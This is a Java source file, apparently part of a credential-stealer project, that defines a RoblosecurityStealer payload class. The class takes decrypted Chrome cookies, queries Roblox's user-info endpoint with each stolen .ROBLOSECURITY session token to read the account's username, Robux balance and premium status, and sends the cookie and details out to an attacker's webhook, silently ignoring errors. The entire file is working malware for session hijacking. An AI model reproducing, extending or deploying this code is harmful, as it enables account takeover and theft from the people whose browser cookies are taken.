package dev.chaarlottte.stealer.payload.impl;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.squareup.okhttp.*;
import com.sun.jna.platform.win32.Crypt32Util;
import dev.chaarlottte.stealer.Configuration;
import dev.chaarlottte.stealer.payload.Payload;
import dev.chaarlottte.stealer.util.PayloadDelivery;
import dev.chaarlottte.stealer.util.Utilities;
import dev.chaarlottte.stealer.util.WebhookMessage;
import org.json.JSONObject;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.sql.*;
import java.util.Date;
import java.util.*;

public class RoblosecurityStealer implements Payload {

    public static ArrayList<ChromeCookies.DecryptedCookie> roblosecurities = new ArrayList<>();

    @Override
    public void execute() throws Exception {
        for(ChromeCookies.DecryptedCookie thing : roblosecurities) {
            try {
                String cookie = thing.getDecryptedValue();
                String username = "", userId = "", robux = "", thumbnailUrl = "";
                boolean premium;

                OkHttpClient client = new OkHttpClient();
                Response resp = client.newCall(new Request.Builder().url("https://www.roblox.com/mobileapi/userinfo").addHeader("Cookie", ".ROBLOSECURITY=" + cookie).build()).execute();
                ResponseBody body = resp.body();
                JSONObject jsonObject = new JSONObject(body.string());
                userId = jsonObject.getInt("UserID") + "";
                robux = jsonObject.getInt("RobuxBalance") + "";
                username = jsonObject.getString("UserName") + "";
                thumbnailUrl = jsonObject.getString("ThumbnailUrl") + "";
                premium = jsonObject.getBoolean("IsPremium");

                WebhookMessage.Builder builder = new WebhookMessage.Builder("Roblox Cookie Found - " + username);
                builder.addField("Cookie", "```fix\n" + cookie + "```", false);
                builder.addField("Username", username, true);
                builder.addField("User ID", userId, true);
                builder.addField("Robux Balance", "R$" + robux, true);
                builder.addField("Has Premium", (premium ? ":thumbsup: :grin:" : ":thumbsdown: :sob:"), true);
                builder.setThumbnailUrl(thumbnailUrl);

                PayloadDelivery.send(builder.build());
            } catch (Exception ignored) {}
        }
    }


}
